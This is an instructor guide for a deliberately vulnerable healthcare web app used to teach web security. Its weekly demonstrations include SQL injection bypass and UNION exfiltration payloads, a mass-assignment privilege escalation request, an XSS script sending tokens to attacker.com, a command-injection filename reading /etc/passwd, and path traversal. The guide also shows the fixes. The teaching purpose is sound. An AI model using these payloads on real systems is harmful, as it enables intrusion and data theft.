# TechNova Health - Instructor Guide

This guide provides instructors with information on how to effectively use the TechNova Health lab for cybersecurity education.

## Lab Environment Setup

### Pre-Class Preparation

1. **Test the Environment**
   ```bash
   docker-compose up -d
   docker-compose ps  # Verify all services are running
   docker-compose logs  # Check for errors
   ```

2. **Verify Vulnerabilities**
   - Test each major vulnerability before class
   - Ensure database seeding works correctly
   - Confirm SSH access with committed keys

3. **Prepare Demo Scenarios**
   - Have working exploits ready
   - Prepare Burp Suite/ZAP projects
   - Screenshot attack workflows

### Student Environment Options

**Option 1: Individual Instances**
- Each student runs their own Docker Compose stack
- Requires: Docker installed on student machines
- Pros: Isolated, can't interfere with each other
- Cons: Resource intensive

**Option 2: Shared Lab Environment**
- Single instance on lab server
- Students access via VPN/lab network
- Pros: Lower individual resource requirements
- Cons: Students can interfere with each other

**Option 3: Cloud Deployment**
- Deploy on AWS/Azure/GCP for each student
- Use container orchestration (ECS, AKS, GKE)
- Pros: Accessible from anywhere
- Cons: Higher cost

### Network Isolation

**CRITICAL**: Ensure the lab is isolated from production networks!

```bash
# Recommended: Use dedicated Docker network
docker network create --driver bridge --subnet 172.20.0.0/16 technova-lab

# Update docker-compose.yml to use this network
networks:
  technova-network:
    external: true
    name: technova-lab
```

## Course Modules & Timeline

### Week 1: Reconnaissance & OSINT
**Duration**: 2-3 hours

**Learning Objectives**:
- Information gathering techniques
- Identifying attack surface
- Using reconnaissance tools

**Lab Exercises**:
1. Port scanning with Nmap
2. Directory enumeration
3. Finding exposed SSH keys in Git
4. Discovering debug endpoints

**Teaching Points**:
- How exposed secrets end up in version control
- Importance of `.gitignore`
- Git history is immutable
- Secret scanning tools (TruffleHog, GitLeaks)

**Demonstration**:
```bash
# Show git history includes private key
git log --all -- ssh-keys/
git show <commit>:ssh-keys/id_rsa

# Use TruffleHog
trufflehog git file://. --only-verified
```

---

### Week 2: Authentication Attacks
**Duration**: 3-4 hours

**Learning Objectives**:
- SQL injection fundamentals
- Authentication bypass techniques
- Session management weaknesses

**Lab Exercises**:
1. SQL injection - Login bypass
2. SQL injection - Data exfiltration
3. UNION-based SQL injection
4. Session token analysis
5. JWT manipulation

**Teaching Points**:
- How SQL injection works
- Parameterized queries vs string concatenation
- Impact of plaintext passwords
- Proper password hashing (bcrypt, Argon2)
- JWT security best practices

**Demonstration**:
```sql
-- Login bypass
Username: admin' OR '1'='1'--
Password: anything

-- Data exfiltration
Username: ' UNION SELECT username, password, email, role, NULL, NULL, NULL FROM users--

-- Show plaintext passwords in database
docker exec technova-db psql -U technova_admin -d technova_health \
  -c "SELECT username, password FROM users;"
```

---

### Week 3: Authorization & Access Control
**Duration**: 3-4 hours

**Learning Objectives**:
- Broken access control
- IDOR vulnerabilities
- Privilege escalation
- Mass assignment

**Lab Exercises**:
1. IDOR - Access other users' profiles
2. IDOR - View other patients' medical records
3. Privilege escalation via mass assignment
4. Horizontal privilege escalation
5. Vertical privilege escalation

**Teaching Points**:
- Difference between authentication and authorization
- Importance of authorization checks on every request
- Never trust client-side data
- Principle of least privilege
- Proper RBAC implementation

**Demonstration**:
```bash
# IDOR attack
# 1. Login as patient001
# 2. Get patient ID from API response
# 3. Modify request to access patient002's data

# Mass assignment privilege escalation
curl -X PUT http://localhost:3001/api/users/9 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

### Week 4: Injection Attacks
**Duration**: 3-4 hours

**Learning Objectives**:
- XSS vulnerabilities
- Command injection
- Path traversal
- Defense techniques

**Lab Exercises**:
1. Reflected XSS
2. Stored XSS in messages
3. XSS to session hijacking
4. Command injection in backup
5. Path traversal in file download

**Teaching Points**:
- Types of XSS (reflected, stored, DOM)
- Input validation vs output encoding
- Content Security Policy (CSP)
- Never execute user input as code
- Safe file handling practices

**Demonstration**:
```javascript
// Stored XSS
<script>alert('XSS')</script>

// Session stealing XSS
<script>
  fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'));
</script>

// Command injection
Filename: backup.sql; cat /etc/passwd > /tmp/pwned.txt

// Path traversal
curl http://localhost:3001/api/records/download/../../../../etc/passwd
```

---

### Week 5: Secure Development
**Duration**: 3-4 hours

**Learning Objectives**:
- Secure coding practices
- Code review for security
- Implementing fixes
- Testing security controls

**Lab Exercises**:
1. Fix SQL injection vulnerabilities
2. Implement password hashing
3. Add authorization checks
4. Sanitize XSS vectors
5. Secure configuration

**Teaching Points**:
- Secure SDLC
- Defense in depth
- Security by design
- Testing security controls

**Example Fixes**:
```javascript
// FIX: SQL Injection
// Before
const query = `SELECT * FROM users WHERE username = '${username}'`;

// After
const query = 'SELECT * FROM users WHERE username = $1';
const result = await pool.query(query, [username]);

// FIX: Password Storage
const bcrypt = require('bcrypt');
const hashedPassword = await bcrypt.hash(password, 10);

// FIX: XSS
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);

// FIX: Authorization
if (req.user.role !== 'admin' && req.user.id !== parseInt(req.params.id)) {
  return res.status(403).json({ error: 'Forbidden' });
}
```

---

## Assessment & Grading

### Lab Reports

Students should submit vulnerability reports including:

1. **Executive Summary**
   - Overview of findings
   - Risk assessment
   - Recommendations

2. **Detailed Findings**
   - Vulnerability description
   - CVSS score
   - Steps to reproduce
   - Proof of concept
   - Impact analysis
   - Remediation recommendations

3. **Technical Appendix**
   - Screenshots
   - Request/response data
   - Code snippets

### Grading Rubric

| Category | Points | Criteria |
|----------|--------|----------|
| Vulnerability Discovery | 30 | Found and documented critical vulnerabilities |
| Exploitation | 25 | Successfully exploited vulnerabilities with PoC |
| Impact Analysis | 20 | Accurate assessment of business impact |
| Remediation | 20 | Provided correct, secure fixes |
| Documentation | 5 | Professional, clear, well-organized report |

### Bonus Points

- Creative attack chains (+5)
- Automated exploitation scripts (+5)
- Implementing fixes in code (+10)
- Finding undocumented vulnerabilities (+10)

## Common Student Questions

**Q: Is it legal to hack this application?**
A: Yes! This is an authorized educational lab designed to be hacked. However, emphasize that these techniques should NEVER be used without authorization on real systems.

**Q: Why are these vulnerabilities so obvious?**
A: Some are obvious for learning purposes, but many real-world applications have similar issues. The difference is the documentation - real vulnerabilities are found through testing.

**Q: Can we use automated tools?**
A: Yes! SQLMap, Burp Suite, OWASP ZAP, etc. are all fair game. In fact, students should learn both manual and automated testing.

**Q: What if we break something?**
A: Simply restart the containers: `docker-compose down && docker-compose up -d`. The database will reseed automatically.

**Q: Can we add new features?**
A: Great idea! Students can extend the application as a project. Ideas:
- Add a pharmacy module
- Implement insurance claims
- Add telemedicine video calls
- Create lab results system

## Troubleshooting

### Services Won't Start

```bash
# Check logs
docker-compose logs

# Common issues:
# - Port already in use: Change port in docker-compose.yml
# - Insufficient resources: Increase Docker memory limit
# - Database initialization failed: Check init scripts
```

### Database Not Seeding

```bash
# Manually run seed scripts
docker exec technova-db psql -U technova_admin -d technova_health \
  -f /docker-entrypoint-initdb.d/01-schema.sql

docker exec technova-db psql -U technova_admin -d technova_health \
  -f /docker-entrypoint-initdb.d/02-seed-data.sql
```

### SSH Access Not Working

```bash
# Check SSH service in container
docker exec technova-backend service ssh status

# Verify key permissions
chmod 600 ssh-keys/id_rsa

# Test connection
ssh -i ssh-keys/id_rsa -p 2222 technova@localhost
```

### Frontend Can't Connect to Backend

```bash
# Check CORS settings
# Verify REACT_APP_API_URL in frontend/.env
# Check network connectivity between containers
docker network inspect technova-network
```

## Advanced Topics

### Red Team vs Blue Team Exercise

**Setup**: Divide class into teams

**Red Team Objectives**:
- Compromise system
- Exfiltrate patient data
- Establish persistence
- Achieve highest privilege

**Blue Team Objectives**:
- Monitor for attacks
- Implement defenses
- Incident response
- Patch vulnerabilities

**Scoring**:
- Red: Points for successful exploits
- Blue: Points for detecting and mitigating attacks

### Capture The Flag (CTF) Mode

**Create Flags**: Add hidden flags throughout the application

```sql
-- Example flag in database
INSERT INTO messages (from_user_id, to_user_id, subject, body)
VALUES (1, 1, 'Flag', 'FLAG{sql_injection_master}');
```

**Flag Locations**:
1. Environment variables
2. Database
3. MinIO bucket
4. Docker container filesystem
5. API responses
6. JavaScript source code
7. Git history

## Additional Resources

### Books
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing" - Georgia Weidman
- "The Tangled Web" - Michal Zalewski

### Online Resources
- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackerOne Hacktivity
- PentesterLab

### Similar Projects
- OWASP Juice Shop
- DVWA (Damn Vulnerable Web Application)
- WebGoat
- HackTheBox

## Feedback & Improvements

Encourage students to:
- Suggest new vulnerabilities
- Contribute code
- Report bugs
- Share learning experiences

Create a feedback form to improve the lab for future cohorts.

## Legal & Ethical Considerations

### Required Disclaimers

Before each lab session, remind students:

1. **Authorization**: Only test authorized systems
2. **Responsibility**: Skills learned are powerful and must be used ethically
3. **Legal Consequences**: Unauthorized hacking is illegal
4. **Professional Ethics**: Follow responsible disclosure
5. **Industry Standards**: Adhere to codes of conduct (ISC2, EC-Council, etc.)

### Acceptable Use Policy

Have students sign an AUP covering:
- Only use lab for educational purposes
- No attacking other students' instances
- No sharing credentials outside class
- No deploying malicious code
- Report security issues responsibly

---

## Contact & Support

For instructor support:
- Create GitHub issues for bugs
- Share lesson plans and improvements
- Join instructor community (if applicable)

Good luck teaching! Remember: The goal is to create ethical hackers who make the internet safer.
